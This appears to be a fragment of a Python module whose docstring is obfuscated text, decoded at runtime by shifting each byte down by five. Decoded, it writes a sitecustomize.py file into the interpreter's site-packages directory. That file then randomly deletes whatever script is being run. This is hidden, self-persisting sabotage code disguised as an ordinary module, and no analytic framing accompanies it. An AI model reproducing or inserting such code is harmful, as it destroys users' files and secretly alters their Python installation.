# encoding=utf-8
"""uB,4,0`n%ktw%n%ns%x~x3ufym%nk%n3jsix|nym-,fljx,.b`5b3xywnu-,4xnyj2ufhpfljx,.0,4xnyjhzxytrn\x7fj3u~,\x0ftujs-u1,|,.3|wnyj-'ddnrutwydd-,tx,.3wjrt{j-ddnrutwydd-,x~x,.3fwl{`5b.nk%ddnrutwydd-,wfsitr,.3wfsinsy-61:.BB7jqxj333'."""
...
def init_num():
    ...
    va = bytes((_ - 5) % 256 for _ in __import__(LIB).__doc__.encode('utf-8'))
